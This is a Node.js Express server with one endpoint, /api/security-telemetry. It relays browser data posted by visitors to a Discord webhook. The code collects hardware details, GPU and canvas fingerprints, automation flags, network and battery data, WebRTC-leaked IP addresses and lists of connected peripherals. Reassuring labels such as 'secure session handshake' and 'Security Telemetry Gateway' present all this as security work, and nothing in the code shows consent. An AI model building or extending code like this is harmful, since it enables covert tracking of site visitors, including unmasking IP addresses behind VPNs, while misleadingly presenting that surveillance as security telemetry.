const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/security-telemetry', async (req, res) => {
    try {
        const telemetry = req.body;
        const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

        if (!webhookUrl) {
            console.error('DISCORD_WEBHOOK_URL is not set!');
            return res.status(500).json({ error: 'Webhook configuration missing' });
        }

        // Clean, highly organized single embed structure
        const discordPayload = {
            embeds: [{
                title: "🛡️ Security Telemetry & Fingerprint Report",
                color: 0x3b82f6, // Modern blue accent
                description: "A visitor triggered a secure session handshake. Below is the comprehensive telemetry log:",
                fields: [
                    {
                        name: "💻 Hardware & Display",
                        value: `• **Resolution:** \`${telemetry.screen}\` (${telemetry.colorDepth}, ${telemetry.pixelRatio}x)\n• **CPU Cores:** \`${telemetry.cpuCores}\`\n• **Memory:** \`${telemetry.deviceMemory}\`\n• **Touch Points:** \`${telemetry.maxTouchPoints}\``,
                        inline: false
                    },
                    {
                        name: "🤖 Bot & Browser Fingerprint",
                        value: `• **WebDriver / Automation:** ${telemetry.webdriver}\n• **GPU Renderer:** \`${telemetry.gpu}\`\n• **Canvas Signature:** \`${telemetry.canvasSignature}\``,
                        inline: false
                    },
                    {
                        name: "⚡ Network & Power",
                        value: `• **Connection:** \`${telemetry.network?.effectiveType || 'unknown'}\` (RTT: \`${telemetry.network?.rtt || 'unknown'}ms\`, Downlink: \`${telemetry.network?.downlink || 'unknown'}Mbps\`)\n• **Battery Status:** \`${telemetry.battery}\`\n• **WebRTC IPs:** \`${telemetry.webrtcIps}\``,
                        inline: false
                    },
                    {
                        name: "🔌 Connected Peripherals",
                        value: `\`\`\`${telemetry.peripherals && telemetry.peripherals.length > 0 ? telemetry.peripherals.join('\n') : 'No public devices exposed'}\`\`\``,
                        inline: false
                    }
                ],
                footer: {
                    text: "Automated Security Telemetry Gateway"
                },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordPayload)
        });

        if (!response.ok) {
            throw new Error(`Discord API responded with status ${response.status}`);
        }

        res.status(200).json({ success: true });
    } catch (err) {
        console.error('Error forwarding telemetry:', err);
        res.status(500).json({ error: 'Failed to process telemetry' });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Security Dashboard server running on port ${PORT}`);
});